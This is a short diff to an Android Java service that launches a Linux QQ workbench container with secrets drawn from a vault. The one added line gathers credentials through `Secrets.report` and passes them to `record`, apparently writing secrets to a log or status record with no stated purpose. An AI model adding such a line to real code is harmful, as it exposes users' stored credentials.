@@ -106,6 +106,7 @@ public final class RuntimeService extends Service {
         env.put("WORKBENCH_MEMORY_KEY",vault.ensure("conversation-memory"));env.put("QQWB_TIME_ZONE",java.util.TimeZone.getDefault().getID());
         env.put("VNC_PASSWORD",vault.ensure("vnc").substring(0,8));
         env.put("QQWB_APT_PROXY",getSharedPreferences("settings",0).getString("setupProxy",""));
+        String credentials=Secrets.report(this);if(!credentials.isEmpty())record(credentials);
         update("检查 Linux QQ 与图形组件…");
         process=container.start("exec flock -n -E 75 /opt/qq-workbench/.runtime.lock bash -c 'bash /opt/qq-workbench/install.sh && exec bash /opt/qq-workbench/session.sh'",env);
         if(stopped){process.destroy();return 0;}
